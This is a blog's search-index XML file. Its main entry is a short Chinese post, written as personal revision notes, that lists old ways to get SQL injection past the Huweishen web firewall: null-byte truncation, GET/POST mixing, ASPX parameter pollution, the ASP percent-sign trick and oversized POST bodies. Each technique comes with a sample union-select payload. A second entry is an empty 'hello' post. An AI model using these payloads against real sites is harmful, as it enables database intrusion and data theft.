<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>一些老的SQL注入绕过方法总结</title>
    <link href="/2021/04/11/post%E4%B8%80%E4%BA%9B%E8%80%81%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <url>/2021/04/11/post%E4%B8%80%E4%BA%9B%E8%80%81%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>#前言<br>高中后技术没怎么进步，甚至开始忘了以前学过的东西，趁着高三前这段时间再复习一下。<br>#护卫神SQL注入<br>##绕过姿势一： %00截断<br>APSX+Mssql中，%00来代替空白字符</p><blockquote><p>id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</p></blockquote><p>##绕过姿势二： GET+POST<br>同时提交GET和POST请求，进入POST逻辑而忽略了GET<br>IIS+ASP/ASPX+Mssql/IIS+PHP+Mysql均适用</p><blockquote><p>id=1 and 1=2 union select 1,column_name,3 from information_schema.columns<br>POST:aaa</p></blockquote><p>##绕过姿势四：ASPX+HPP<br>在ASPX中，当GET/POST/COOKIE同时提交参数id，服务端接受参数id的顺序，GET,POST,COOKIE,中间通过逗号连接</p><p>##绕过姿势五： ASP%特性<br>当我们输入un%ion的时候，解释会去掉%号，服务端接受的参数是union</p><blockquote><p>id=1 and 1=2 un%ion select 1,2,column_name from information_schema.columns</p></blockquote><p>##绕过姿势六：缓冲区溢出</p><blockquote><p>id=1 and 1=2 union /*<br>POST:<em>/select 1,column_name,3 from information_schema.columns<br>*PHP+Mysql中，使用POST大包溢出可成功bypass</em><br>test.php<br>POST: id=1 (select 1)=(select 0xA*100) union select 1,2.table_name from information_schema.tables</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hello</title>
    <link href="/2020/07/05/hello/"/>
    <url>/2020/07/05/hello/</url>
    
    <content type="html"><![CDATA[<h1 id="My-first-blog"><a href="#My-first-blog" class="headerlink" title="My first blog"></a>My first blog</h1><p>123</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
